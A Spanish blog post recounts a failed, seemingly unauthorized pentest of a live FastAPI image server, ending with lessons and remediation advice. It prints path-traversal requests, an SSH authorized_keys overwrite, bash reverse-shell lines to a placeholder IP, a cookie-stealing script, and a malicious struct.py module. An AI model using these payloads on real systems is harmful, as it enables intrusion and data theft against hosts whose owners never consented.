---
layout: post
title: "Cuando las Vulnerabilidades Existen Pero No Se Dejan Explotar: Una Lecci√≥n de Humildad T√©cnica"
date: 2026-02-05
categories: [Pentesting, Ciberseguridad, Reflexi√≥n T√©cnica]
tags: [pentesting, web-security, python, lfi, path-traversal, command-injection, ctf, learning]
image:
  path: /assets/img/2026-02-05-pentest-teorico-vs-practico/kalifrustration.png
  alt: Terminal mostrando intentos fallidos de explotaci√≥n
---

> "En el papel, la vulnerabilidad existe. En la infraestructura, la complejidad del entorno dicta si es explotable o no."

**Fecha:** 05 de Febrero de 2026

**Objetivo:** xx.xxx.37.24 (ESP Image Server - Python/Uvicorn)

**Resultado:** Vulnerabilidades confirmadas, explotaci√≥n fallida

**Lecci√≥n aprendida:** El pentesting real no siempre termina con una shell

---

## üéØ El Contexto: Cuando La Infraestructura Te Reta

Este no fue un CTF com√∫n donde sabes que hay una soluci√≥n elegante esper√°ndote. Esto fue una infraestructura real, un servidor a priori vulnerable, y que result√≥ ser mucho m√°s resiliente de lo que esperaba.

El objetivo era simple en papel: una API REST construida en Python (FastAPI/Uvicorn) que manejaba la generaci√≥n de im√°genes para dispositivos ESP32. Swagger UI expuesto, m√∫ltiples endpoints, y la promesa de vulnerabilidades esperando ser explotadas.

Despu√©s de m√°s de seis horas de trabajo intenso, m√∫ltiples vectores de ataque probados sistem√°ticamente, y docenas de payloads cuidadosamente crafteados, me encontr√© en una situaci√≥n que todo pentester experimenta pero pocos admiten abiertamente: ten√≠a las vulnerabilidades confirmadas frente a m√≠, pero no pod√≠a convertirlas en acceso real al sistema.

Esta es la historia de ese proceso, de las t√©cnicas que funcionaron para descubrir pero fallaron para explotar, y de por qu√© a veces el mejor hallazgo es entender tus propias limitaciones.

---

## üîç Fase 1: Reconocimiento ‚Äî El Mapa del Territorio

### Enumeraci√≥n Inicial

El escaneo con Nmap revel√≥ un panorama interesante: m√∫ltiples servicios corriendo en puertos est√°ndar y no est√°ndar, infraestructura Cloudron en puertos web tradicionales, servicios de email configurados, y lo m√°s tentador: el puerto 8000 ejecutando Uvicorn.

```bash
# Fragmento del escaneo
25/open/tcp//smtp///
80/open/tcp//http//nginx/
443/open/tcp//ssl|http//nginx/
465/open/tcp//ssl|smtp///
587/open/tcp//smtp///
993/open/tcp//imaps?///
995/open/tcp//pop3s?///
8000/open/tcp//http-alt//uvicorn/
30000-31337/open/tcp//filtered///
```

La presencia de Cloudron en los puertos est√°ndar era interesante pero poco prometedora debido a Cloudflare en frente. Los servicios de email podr√≠an tener potencial. Pero el puerto 8000 gritaba "at√°came primero".

### El Descubrimiento: Swagger UI Expuesto

Navegar a `http://xx.xxx.37.24:8000/docs` fue como encontrar los planos arquitect√≥nicos de un edificio que planeas infiltrar. Ah√≠ estaba todo: documentaci√≥n completa de la API, esquemas de datos, ejemplos de requests, endpoints cr√≠ticos completamente mapeados.

Los endpoints que llamaron mi atenci√≥n inmediatamente fueron tres:

**POST /upload** ‚Äî Subida de archivos arbitrarios. El primer pensamiento obvio: ¬øpuedo subir un webshell? ¬øHay validaci√≥n de tipo de archivo? ¬øD√≥nde se guardan los archivos subidos?

**POST /set-config** ‚Äî Configuraci√≥n del servidor. Cualquier endpoint que modifica configuraci√≥n es potencialmente peligroso. ¬øAcepta JSON? ¬øValida el input? ¬øQu√© par√°metros controla?

**POST /generate** ‚Äî Generaci√≥n de archivos binarios. Procesos que generan c√≥digo o archivos son notoriamente dif√≠ciles de asegurar. ¬øQu√© librer√≠as usa? ¬øHay inyecci√≥n de plantillas? ¬øEscapan las variables correctamente?

### Fuga de Informaci√≥n: El Regalo Inesperado

Probar el endpoint `/set-config` con payloads b√°sicos revel√≥ algo que no deber√≠a estar visible: el c√≥digo HTML completo del panel de administraci√≥n, incluyendo rutas absolutas del sistema de archivos.

```
Error: cannot process file at '/home/prox/holi/uploads/test.png'
```

Ah√≠ estaba todo lo que necesitaba saber para construir mis ataques: usuario del sistema (`prox`), estructura de directorios (`/home/prox/holi/`), y confirmaci√≥n de que la aplicaci√≥n procesaba archivos en una ubicaci√≥n predecible.

Este tipo de fuga de informaci√≥n es exactamente lo que buscas en la fase de reconocimiento. No es la vulnerabilidad final, pero es el mapa que te dice d√≥nde buscar.

---

## üó°Ô∏è Fase 2: Confirmaci√≥n de Vulnerabilidades ‚Äî La Teor√≠a Funciona

### Path Traversal: La Vulnerabilidad Cl√°sica

El endpoint `/generate` aceptaba un par√°metro `image_file` que supuestamente deb√≠a apuntar a una imagen en el directorio de uploads. La pregunta obvia: ¬øqu√© pasa si le doy una ruta que sale de ese directorio?

```http
POST /generate
{
  "image_file": "../../../../etc/passwd"
}
```

La respuesta del servidor fue reveladora:

```
Error: cannot identify image file '/home/prox/holi/uploads/../../../../etc/passwd'
```

Esto confirmaba tres cosas cr√≠ticas. Primero, el servidor procesaba la secuencia `../` sin sanitizaci√≥n, permitiendo path traversal. Segundo, el archivo `/etc/passwd` exist√≠a y el servidor intent√≥ accederlo (si no existiera, el error ser√≠a diferente). Tercero, hab√≠a una librer√≠a gr√°fica (probablemente Pillow) intentando procesar el archivo como imagen, lo cual fallaba porque es texto plano.

Esta es una vulnerabilidad de manual: Local File Inclusion confirmada. En teor√≠a, esto deber√≠a permitir leer archivos arbitrarios del sistema. En pr√°ctica, la librer√≠a gr√°fica se interpone entre nosotros y la exfiltraci√≥n de datos.

### Upload Overwrite: Escritura Arbitraria

El endpoint `/upload` era a√∫n m√°s permisivo. Aceptaba un par√°metro `filename` que controlaba d√≥nde se guardaba el archivo subido. Probando con path traversal:

```http
POST /upload
filename=../../.ssh/authorized_keys
[archivo con llave SSH p√∫blica]
```

El servidor procesaba la request sin errores. El archivo se escrib√≠a. No hab√≠a validaci√≥n de la ruta de destino. Esto significa escritura arbitraria en cualquier ubicaci√≥n del filesystem accesible por el usuario `prox`.

En la teor√≠a del pentesting, esto es cr√≠tico: si puedes escribir archivos arbitrarios, puedes modificar configuraciones, sobrescribir c√≥digo fuente, plantar backdoors, incluso modificar archivos del sistema si los permisos lo permiten.

### Command Injection: El Espejismo

El par√°metro `array_name` en `/generate` se usaba para nombrar variables en el c√≥digo C generado. Prob√© todos los payloads cl√°sicos de command injection:

```python
# Intentos con diferentes shells y t√©cnicas de bypass
test; bash -c 'bash -i >& /dev/tcp/[mi-ip]/4444 0>&1'
test;sleep${IFS}10;
test';sleep${IFS}10;'
test";sleep${IFS}10;"
test`sleep 10`
test$(sleep 10)
```

Todos resultaban en el mismo error: Internal Server Error 500. El servidor crasheaba, pero no ejecutaba los comandos. Las respuestas llegaban instant√°neamente, sin delays, confirmando que `sleep` nunca se ejecut√≥.

Esto apuntaba a un patr√≥n espec√≠fico de implementaci√≥n: el backend probablemente usaba `subprocess.run()` con lista de argumentos en lugar de `os.system()` con string concatenado. La diferencia es fundamental.

En `os.system("comando " + input_usuario)`, el shell interpreta todo el string, haciendo que caracteres como `;` funcionen como separadores de comandos. Es vulnerable por dise√±o.

En `subprocess.run(["comando", input_usuario])`, cada elemento de la lista es un argumento separado. El punto y coma se pasa literalmente como texto al comando, no como separador. Esto neutraliza la inyecci√≥n cl√°sica.

Era una implementaci√≥n defensiva accidental: no estaban sanitizando el input, pero el dise√±o del c√≥digo evitaba la ejecuci√≥n.

---

## üíÄ Fase 3: Intentos de Explotaci√≥n ‚Äî Cuando la Realidad No Coopera

### Intento 1: SSH Key Injection

Con la capacidad de escribir archivos arbitrarios, la ruta obvia era comprometer SSH. Gener√© un par de llaves, sub√≠ la p√∫blica a `.ssh/authorized_keys` del usuario prox, y intent√© conectarme.

```bash
ssh -i id_rsa prox@xx.xxx.37.24
```

El servidor ped√≠a password. SSH ignoraba completamente mi llave. Esto suger√≠a uno de varios problemas: permisos incorrectos en el archivo o directorio (SSH es extremadamente estricto con esto), el archivo no se escribi√≥ en la ubicaci√≥n correcta, o SSH estaba configurado para deshabilitar autenticaci√≥n por llaves.

Revisar esto requerir√≠a acceso al servidor para ver logs y permisos, lo cual era exactamente lo que no ten√≠a.

### Intento 2: Template Injection / HTML Overwrite

Si no pod√≠a entrar por SSH, tal vez pod√≠a modificar la aplicaci√≥n web directamente. Sobrescrib√≠ archivos en el directorio `templates/` con HTML malicioso:

```html
<!-- index.html modificado -->
<script>
fetch('http://[mi-servidor]/exfil?data=' + document.cookie);
</script>
```

El archivo se escribi√≥ exitosamente. Acced√≠ a la aplicaci√≥n web. El HTML no cambi√≥. La p√°gina segu√≠a mostrando el contenido original.

Esto indicaba que la aplicaci√≥n usaba cach√© agresivo o recargaba los templates solo al reiniciar el servidor. Sin capacidad de reiniciar el servicio, este vector estaba bloqueado.

### Intento 3: Reverse Shell via Firewall Bypass

Los intentos directos de reverse shell fallaban porque Azure bloqueaba conexiones salientes en puertos no est√°ndar. Prob√© t√©cnicas de bypass:

Usar puertos comunes que t√≠picamente est√°n permitidos (80, 443, 53). Tunneling a trav√©s de DNS (dnscat2). Reverse shell a trav√©s de ICMP. HTTP polling (la shell se conecta a mi servidor cada X segundos para buscar comandos).

Todos fallaban en el mismo punto: no pod√≠a ejecutar el c√≥digo que iniciar√≠a la conexi√≥n. Ten√≠a escritura de archivos, pero no ejecuci√≥n de c√≥digo arbitrario.

### Intento 4: Python Module Hijacking

Esta fue probablemente la t√©cnica m√°s sofisticada que intent√©. La idea era explotar c√≥mo Python importa m√≥dulos.

Python busca m√≥dulos en un orden espec√≠fico: primero en el directorio actual, luego en paths del sistema. Si puedo escribir un archivo `random.py` o `os.py` en el directorio de la aplicaci√≥n, cuando la aplicaci√≥n haga `import random`, cargar√° mi c√≥digo malicioso en lugar del m√≥dulo leg√≠timo.

Escrib√≠ m√≥dulos maliciosos para librer√≠as que la aplicaci√≥n importaba:

```python
# struct.py malicioso
import os
os.system('bash -c "bash -i >& /dev/tcp/[mi-ip]/4444 0>&1"')
# C√≥digo normal del m√≥dulo despu√©s para no romper la app
```

Sobrescrib√≠ `struct.py` y `colorsys.py` en el directorio de la aplicaci√≥n. La pr√≥xima request que procesara el servidor deber√≠a importar mis m√≥dulos y ejecutar el payload.

El resultado: "Error: broken data stream". El servidor crasheaba al intentar importar mi m√≥dulo corrupto, abortando antes de ejecutar mi payload. El proceso de Uvicorn ten√≠a alg√∫n mecanismo de recuperaci√≥n que reiniciaba el worker sin ejecutar c√≥digo malicioso.

Estaba confirmando que mi c√≥digo s√≠ se cargaba (por eso el crash), pero el servidor se proteg√≠a matando el proceso antes de la ejecuci√≥n completa.

---

## üß† An√°lisis T√©cnico: Por Qu√© Fallaron los Ataques

### El Patr√≥n del Error 500

Cada intento de inyecci√≥n resultaba en HTTP 500 Internal Server Error con un tiempo de respuesta instant√°neo. Esto es diagn√≥stico de un patr√≥n espec√≠fico de c√≥digo:

```python
# Patr√≥n probable en el backend
try:
    # C√≥digo que procesa input del usuario
    array_name = request.json['array_name']
    generated_code = f"static const uint8_t {array_name}[] = ..."
    # ... m√°s procesamiento
except Exception as e:
    # Log del error
    return {"error": "Internal Server Error"}, 500
```

El bloque `try-except` demasiado amplio captura cualquier excepci√≥n, incluyendo errores de sintaxis causados por payloads maliciosos, y aborta la ejecuci√≥n antes de que el c√≥digo problem√°tico pueda correr.

Esto no es sanitizaci√≥n correcta del input (deber√≠an validar y rechazar caracteres peligrosos antes del procesamiento), pero es efectivo como defensa accidental. Es como tener un sensor de humo que apaga toda la casa al detectar una chispa.

### La Barrera de Pillow

La librer√≠a de procesamiento de im√°genes (Pillow en Python) es extremadamente estricta sobre qu√© archivos acepta. Cuando intentaba leer archivos del sistema v√≠a path traversal:

```python
# Lo que probablemente hace el c√≥digo
from PIL import Image
img = Image.open(file_path)  # Falla si no es imagen v√°lida
```

Pillow parsea los primeros bytes del archivo para identificar el formato (PNG, JPEG, etc.). Si encuentra texto plano, lanza una excepci√≥n inmediatamente. El bloque try-except captura esto y aborta.

No pude leer archivos de texto como `/etc/passwd`, c√≥digo fuente Python, o archivos de configuraci√≥n. Solo funcionar√≠a con im√°genes leg√≠timas, lo cual no me serv√≠a para exfiltraci√≥n.

### El Dilema del Pentester: Teor√≠a vs Pr√°ctica

Aqu√≠ est√° la realidad inc√≥moda que experiment√©: confirm√© m√∫ltiples vulnerabilidades que en papel son de severidad alta o cr√≠tica seg√∫n cualquier framework de scoring (CVSS, OWASP). Path traversal, escritura arbitraria de archivos, posible command injection, exposici√≥n de informaci√≥n sensible.

Pero no pude convertir ninguna en acceso real al sistema. No obtuve shell, no le√≠ archivos sensibles, no ejecut√© c√≥digo arbitrario de forma controlada. En un engagement de pentesting real, esto plantea preguntas complejas sobre c√≥mo reportar y clasificar estos hallazgos.

¬øEs una vulnerabilidad cr√≠tica si existe en teor√≠a pero no puede ser explotada pr√°cticamente sin semanas de ingenier√≠a reversa? ¬øD√≥nde est√° la l√≠nea entre un hallazgo de severidad media y uno cr√≠tico?

---

## üéì Lo Que Este "Fracaso" Me Ense√±√≥

### Lecci√≥n 1: Las Vulnerabilidades Te√≥ricas No Garantizan Explotaci√≥n

La educaci√≥n en ciberseguridad tiende a presentar las vulnerabilidades como binarias: existe o no existe, funciona o no funciona. La realidad es mucho m√°s matizada.

Hay un espectro continuo entre "completamente seguro" y "trivialmente explotable". Este servidor viv√≠a en alg√∫n punto intermedio: ten√≠a agujeros de seguridad reales, pero una combinaci√≥n de decisiones de dise√±o (algunas intencionales, otras accidentales) hac√≠a la explotaci√≥n pr√°ctica extremadamente dif√≠cil.

Aprend√≠ a distinguir entre confirmar que una vulnerabilidad existe versus demostrar que puede ser explotada con impacto real. Ambas son habilidades valiosas, pero son diferentes.

### Lecci√≥n 2: El Valor del Reconocimiento Exhaustivo

Aunque no logr√© explotaci√≥n final, el proceso de reconocimiento fue impecable. Mape√© completamente la superficie de ataque, identifiqu√© todos los endpoints relevantes, descubr√≠ la estructura del filesystem, confirm√© el usuario del sistema, entend√≠ las tecnolog√≠as en uso.

Este conocimiento no se pierde. En un engagement real, este nivel de reconocimiento informar√≠a el reporte de vulnerabilidades y las recomendaciones de remediaci√≥n, incluso sin explotaci√≥n completa.

### Lecci√≥n 3: Saber Cu√°ndo Parar Es Una Habilidad

Hay un momento en todo pentest donde tienes que evaluar si seguir invirtiendo tiempo en un vector espec√≠fico vale la pena versus explorar otros caminos o admitir que llegaste al l√≠mite de tu capacidad actual.

Invert√≠ m√°s de seis horas probando sistem√°ticamente docenas de t√©cnicas diferentes. Cada intento fallido me ense√±aba algo sobre c√≥mo estaba construido el servidor. Pero lleg√≥ un punto donde seguir era terquedad, no metodolog√≠a.

En el mundo real, el tiempo es un recurso limitado. Un pentester profesional tendr√≠a que decidir: ¬ødedico otra semana a intentar explotar esto, o documento lo que encontr√© y paso al siguiente objetivo?

### Lecci√≥n 4: El Pentesting Real Es Messy

Los CTFs y los labs de pr√°ctica tienen soluciones elegantes. Hay una flag esper√°ndote. Hay un camino claro de A a B.

El pentesting real es ca√≥tico, frustrante, y lleno de callejones sin salida. Pasas horas siguiendo una pista prometedora solo para descubrir que est√° bloqueada. Encuentras una vulnerabilidad perfecta en teor√≠a que es inexplotable en pr√°ctica. Confirmas que algo est√° roto pero no puedes convertirlo en acceso.

Esta experiencia me dio una perspectiva mucho m√°s realista de c√≥mo es el trabajo de pentesting profesional, m√°s all√° de los escenarios controlados de aprendizaje.

---

## üîÑ Si Volviera a Intentarlo: Caminos No Explorados

### Vector 1: Fuzzing Sistem√°tico del Parser

No explor√© exhaustivamente qu√© combinaciones exactas de caracteres causan qu√© tipos de errores en el endpoint de generaci√≥n. Un script de fuzzing m√°s sofisticado podr√≠a encontrar una secuencia espec√≠fica que bypasea el try-except.

```python
# Fuzzer hipot√©tico
payloads = [
    "test\x00sleep",  # Null byte injection
    "test\nsleep",    # Newline injection
    "test\rsleep",    # Carriage return
    # Combinaciones de encoding
]
```

Tal vez existe una forma de inyectar c√≥digo que no causa una excepci√≥n de sintaxis en Python pero s√≠ ejecuta comandos cuando el c√≥digo generado se procesa.

### Vector 2: Contaminaci√≥n del Environment

Los archivos `.bashrc` y `.profile` que descubr√≠ son ejecutados autom√°ticamente cuando el usuario `prox` inicia sesi√≥n. Si pudiera forzar un login (quiz√°s crasheando el servicio de forma que reinicie con el usuario prox), mi c√≥digo malicioso en `.bashrc` se ejecutar√≠a.

```bash
# En .bashrc sobrescrito
bash -i >& /dev/tcp/[mi-ip]/4444 0>&1
```

Esto requerir√≠a encontrar una forma de reiniciar el servicio o forzar un nuevo login, lo cual no explor√© completamente.

### Vector 3: Explotaci√≥n de Servicios Secundarios

Me enfoqu√© casi exclusivamente en el puerto 8000. Los servicios de email (SMTP 25/587, IMAP 993) quedaron sin explorar. Estos podr√≠an tener configuraciones d√©biles, credenciales por defecto, o sus propias vulnerabilidades.

En retrospectiva, deb√≠ invertir tiempo en enumerar todos los servicios antes de hacer deep dive en uno solo.

### Vector 4: An√°lisis de Tr√°fico y Race Conditions

No explor√© si hab√≠a race conditions en la forma que el servidor procesa uploads y genera archivos. Si dos requests simult√°neas causan que el servidor sobrescriba archivos en medio del procesamiento, podr√≠a haber una ventana para inyectar c√≥digo que s√≠ se ejecuta.

```python
# Thread 1: sube archivo leg√≠timo
# Thread 2: sobrescribe el archivo mientras se procesa
# ¬øEl servidor ejecuta parte del original y parte del sobrescrito?
```

Esto requerir√≠a scripting m√°s sofisticado y timing preciso.

---

## üìä El Reporte Que Escribir√≠a

Si esto fuera un engagement profesional, mi reporte incluir√≠a:

**Vulnerabilidades Confirmadas (con evidencia):**

**V1: Path Traversal en endpoint /generate** ‚Äî Severidad Alta. Permite leer archivos del filesystem con limitaci√≥n de que deben ser im√°genes v√°lidas. Impacto parcial pero real.

**V2: Escritura Arbitraria de Archivos v√≠a /upload** ‚Äî Severidad Cr√≠tica en papel, Alta en pr√°ctica. Permite modificar archivos del sistema pero explotaci√≥n completa no demostrada.

**V3: Information Disclosure en /set-config** ‚Äî Severidad Media. Expone rutas del sistema y estructura interna.

**V4: Swagger UI sin autenticaci√≥n** ‚Äî Severidad Baja. Facilita el reconocimiento pero no es explotable directamente.

**Recomendaciones de Remediaci√≥n:**

Implementar validaci√≥n estricta de paths en todos los endpoints que manejan archivos. Usar `os.path.basename()` para extraer solo el nombre de archivo, rechazando cualquier path que contenga `../` o rutas absolutas.

Autenticar el acceso a documentaci√≥n de API (Swagger UI) o limitarlo solo a entornos de desarrollo.

Implementar sanitizaci√≥n de inputs adem√°s de error handling. Los bloques try-except no son una defensa de seguridad, son para recuperaci√≥n de errores.

Restringir permisos del usuario que ejecuta el servicio. El usuario prox no deber√≠a tener write access a archivos cr√≠ticos del sistema.

Considerar implementar un WAF o rate limiting para dificultar ataques de fuerza bruta y fuzzing.

---

## üí≠ Reflexi√≥n Final: El Valor del Fracaso T√©cnico

No obtuve la shell. No captur√© ninguna flag. No compromet√≠ el sistema completamente.

Pero aprend√≠ m√°s de este desaf√≠o "fallido" que de muchos CTFs que resolv√≠ exitosamente. Experiment√© la frustraci√≥n real del pentesting profesional. Desarroll√© resiliencia t√©cnica al seguir probando enfoque tras enfoque sin rendirme. Profundic√© en t√©cnicas de explotaci√≥n web que ahora entiendo visceralmente, no solo conceptualmente.

Este conocimiento no se pierde. Se acumula. La pr√≥xima vez que encuentre un servidor con path traversal, sabr√© exactamente qu√© limitaciones buscar. Cuando vea error 500s consistentes, reconocer√© el patr√≥n de try-except demasiado amplio. Cuando tenga escritura de archivos pero no ejecuci√≥n, sabr√© que vectores explorar.

El pentesting no siempre termina con una shell root y una flag. A veces termina con un entendimiento profundo de c√≥mo un sistema se defiende, qu√© t√©cnicas no funcionan, y d√≥nde est√°n tus propios l√≠mites actuales.

Y eso, en su propia forma, es una victoria.

Porque el mejor pentester no es el que siempre tiene √©xito. Es el que aprende de cada intento, documenta cada hallazgo, y convierte cada frustraci√≥n en conocimiento para el pr√≥ximo desaf√≠o.

El servidor sigue ah√≠, esperando. Tal vez en unos d√≠as, con perspectiva fresca, se me ocurra la t√©cnica exacta que necesito. O tal vez no. Pero el proceso, la metodolog√≠a, el aprendizaje ‚Äî eso ya es m√≠o.

**Solve et coagula**

---

*¬øHas enfrentado vulnerabilidades te√≥ricas que no pudiste explotar? ¬øQu√© t√©cnicas usas cuando el pentesting no va seg√∫n el plan? Me encantar√≠a conocer tus experiencias. Cont√°ctame por alguna de mis redes.*

---

## Referencias T√©cnicas

**Herramientas Usadas:**
- Nmap 7.x ‚Äî Port scanning y service enumeration
- ffuf ‚Äî Web fuzzing y directory discovery
- Nuclei ‚Äî Automated vulnerability scanning
- Burp Suite Community ‚Äî Manual request manipulation
- curl/Python requests ‚Äî Custom payload delivery
- Exegol ‚Äî Pentesting environment

**Lecturas Recomendadas:**
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/) - Metodolog√≠as de testing
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) - Repositorio de payloads
- [HackTricks](https://book.hacktricks.xyz/) - T√©cnicas de pentesting documentadas
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) - Labs interactivos

**Conceptos T√©cnicos Explorados:**
- Path Traversal / Local File Inclusion (LFI)
- Command Injection y bypass de filtros
- Python subprocess vs os.system security implications
- SSH authorized_keys file permissions
- Module hijacking en Python
- Defensive programming patterns
